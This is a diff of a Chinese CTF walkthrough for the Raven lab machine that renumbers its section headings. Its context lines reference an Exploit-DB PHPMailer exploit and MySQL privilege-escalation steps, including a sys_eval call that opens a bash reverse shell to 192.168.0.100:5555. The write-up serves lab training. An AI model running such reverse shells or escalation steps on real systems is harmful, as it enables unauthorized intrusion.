@@ -156,7 +156,7 @@ File Type: Python script, Unicode text, UTF-8 text executable
 
 
 <details>
-<summary>官方：https://www.exploit-db.com/exploits/40974 的源代码如下：</summary>
+<summary>6. 官方：https://www.exploit-db.com/exploits/40974 的源代码如下：</summary>
 
 ```python
 """
@@ -229,7 +229,7 @@ if r.status_code == 200:
 </details>
 
 <details>
-<summary>需要做以下修改：</summary>
+<summary>7. 需要做以下修改：</summary>
 
 ```python
 # coding: utf-8
@@ -316,7 +316,7 @@ if r.status_code == 200:
 
 
 
-> 6. mysql提权
+> 8. mysql提权
 
 <details>
 <summary>上传LinEnum.sh脚本并执行</summary>
@@ -1306,7 +1306,7 @@ drwxr-xr-x 12 root     root   4096 Aug 13  2018 ..
 ~~~
 
 <details>
-<summary>sql提权过程</summary>
+<summary>9. sql提权过程</summary>
 
 ```sql
 create table foo(line blob);
@@ -1334,7 +1334,7 @@ mysql> select sys_eval("bash -c 'exec bash -i &>/dev/tcp/192.168.0.100/5555 <&1'
 
 
 <details>
-<summary>7. 至于flag，大家自己找吧，我知道的应该就4个:(第三个是一个图片，因此需要用浏览器加载出来)</summary>
+<summary>10. 至于flag，大家自己找吧，我知道的应该就4个:(第三个是一个图片，因此需要用浏览器加载出来)</summary>
 
 ```shell
 root@Raven:/var/www/html/vendor# cat PATH
